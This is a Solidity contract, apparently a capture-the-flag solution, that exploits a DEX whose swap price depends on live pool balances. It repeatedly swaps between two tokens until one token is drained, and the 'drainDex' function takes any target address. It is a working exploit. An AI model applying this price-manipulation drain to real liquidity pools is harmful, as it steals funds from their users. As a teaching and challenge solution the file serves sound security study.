// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function balanceOf(address token, address account) external view returns (uint256);
}

contract DexSolution {
    /*
     * The vulnerability in the DEX is in the getSwapPrice function:
     * swapAmount = (amount * balanceOf(to)) / balanceOf(from)
     * 
     * This pricing mechanism can be exploited by performing a series of swaps
     * that manipulate the balance ratios, eventually allowing us to drain one token.
     * 
     * Starting conditions (typical):
     * - DEX has 100 token1 and 100 token2
     * - Player has 10 token1 and 10 token2
     * 
     * Exploit sequence:
     * 1. Swap 10 token1 -> get 10 token2 (DEX: 110 token1, 90 token2)
     * 2. Swap 20 token2 -> get 24 token1 (DEX: 86 token1, 110 token2)  
     * 3. Swap 24 token1 -> get 30 token2 (DEX: 110 token1, 80 token2)
     * 4. Swap 30 token2 -> get 41 token1 (DEX: 69 token1, 110 token2)
     * 5. Swap 41 token1 -> get 65 token2 (DEX: 110 token1, 45 token2)
     * 6. Swap 45 token2 -> get 110 token1 (DEX: 0 token1, 90 token2)
     * 
     * Result: We've drained all token1 from the DEX!
     */
    
    function drainDex(address dexAddress) external {
        IDex dex = IDex(dexAddress);
        address token1 = dex.token1();
        address token2 = dex.token2();
        
        // Approve DEX to spend our tokens
        IERC20(token1).approve(dexAddress, type(uint256).max);
        IERC20(token2).approve(dexAddress, type(uint256).max);
        
        // Perform the exploit sequence
        // Note: In the last swap, we need to calculate the exact amount
        // to avoid trying to swap more than the DEX has
        
        dex.swap(token1, token2, 10);
        dex.swap(token2, token1, 20);
        dex.swap(token1, token2, 24);
        dex.swap(token2, token1, 30);
        dex.swap(token1, token2, 41);
        
        // For the final swap, calculate the exact amount needed
        uint256 dexToken1Balance = dex.balanceOf(token1, address(dex));
        uint256 dexToken2Balance = dex.balanceOf(token2, address(dex));
        uint256 myToken2Balance = IERC20(token2).balanceOf(address(this));
        
        // We want to drain all remaining token1
        // Using the formula: amountIn = (amountOut * balanceIn) / balanceOut
        uint256 token2Needed = (dexToken1Balance * dexToken2Balance) / dexToken1Balance;
        
        // Make sure we don't try to swap more than we have
        if (token2Needed > myToken2Balance) {
            token2Needed = myToken2Balance;
        }
        
        // If this would drain exactly, do it. Otherwise swap all we have.
        if (dex.getSwapPrice(token2, token1, token2Needed) == dexToken1Balance) {
            dex.swap(token2, token1, token2Needed);
        } else {
            dex.swap(token2, token1, 45); // Based on our calculations
        }
    }
}